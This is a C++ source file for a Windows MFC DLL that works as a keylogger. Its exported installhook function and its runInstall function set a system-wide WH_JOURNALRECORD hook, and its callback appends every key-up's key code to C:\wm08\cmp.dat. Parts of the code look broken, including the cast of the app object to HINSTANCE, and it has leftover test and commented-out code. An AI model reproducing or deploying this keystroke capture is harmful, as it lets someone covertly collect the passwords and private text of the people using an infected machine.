// KM_dll.cpp : 定义 DLL 的初始化例程。
//

#include "stdafx.h"
#include "KM_dll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//
//TODO: 如果此 DLL 相对于 MFC DLL 是动态链接的，
//		则从此 DLL 导出的任何调入
//		MFC 的函数必须将 AFX_MANAGE_STATE 宏添加到
//		该函数的最前面。
//
//		例如:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// 此处为普通函数体
//		}
//
//		此宏先于任何 MFC 调用
//		出现在每个函数中十分重要。这意味着
//		它必须作为函数中的第一个语句
//		出现，甚至先于所有对象变量声明，
//		这是因为它们的构造函数可能生成 MFC
//		DLL 调用。
//
//		有关其他详细信息，
//		请参阅 MFC 技术说明 33 和 58。
//

// CKM_dllApp

BEGIN_MESSAGE_MAP(CKM_dllApp, CWinApp)
END_MESSAGE_MAP()


// CKM_dllApp 构造

CKM_dllApp::CKM_dllApp()
{
	// TODO: 在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的一个 CKM_dllApp 对象

CKM_dllApp theApp;


// CKM_dllApp 初始化

static HHOOK hkb = NULL;
HINSTANCE hIns;

BOOL CKM_dllApp::InitInstance()
{
	CWinApp::InitInstance();
    hIns = (HINSTANCE)this;
	return TRUE;
}


void  __declspec(dllexport)__stdcall installhook()
{
    system("md c:\\wm08");
    hkb = SetWindowsHookExW(WH_JOURNALRECORD,//WH_KEYBOARD,
                           (HOOKPROC)KeyboardProc,
                           hIns,
                           0);
    while (true)
        Sleep(1000000000);
}




static HWND hWndMain;
static HHOOK hKeyHook;
static const UINT myMessage = 2000;

void SetHook(HWND hMainWnd, bool nCode)
{
    if (nCode)
    {
        hWndMain = hMainWnd;
        hKeyHook = SetWindowsHookEx(WH_JOURNALRECORD,
                           (HOOKPROC)KeyboardProc,
                           hIns,
                           0);
    }
    else
        UnhookWindowsHookEx(hKeyHook);
}

LRESULT CALLBACK KeyboardProc(int nCode,
                              WPARAM wParam,
                              LPARAM lParam)
{    
    /*
    freopen("C:\\wm08\\cmp.dat", "a", stdout);
    if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
    {
        putchar(wParam);
    }
    fclose(stdout);
    */
    EVENTMSG *keyMSG = (EVENTMSG *)lParam;
    if ((nCode == HC_ACTION) && (keyMSG->message == WM_KEYUP))
    {
        
        freopen("C:\\wm08\\cmp.dat", "a", stdout);
        putchar(keyMSG->paramL);
        fclose(stdout);
        //PostMessageW(hWndMain, myMessage, (char)(keyMSG->paramL), 1);
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
    //return CallNextHookEx(hkb, nCode, wParam, lParam);
}

void test()
{
    freopen("test.txt", "a", stdout);
    printf("aaa");
    fclose(stdout);
}

void runInstall()
{
    system("md c:\\wm08");
    hKeyHook = SetWindowsHookEx(WH_JOURNALRECORD,
        (HOOKPROC)KeyboardProc,
        hIns,
        0);
    test();
    while (true)
    {
        ;
    }
}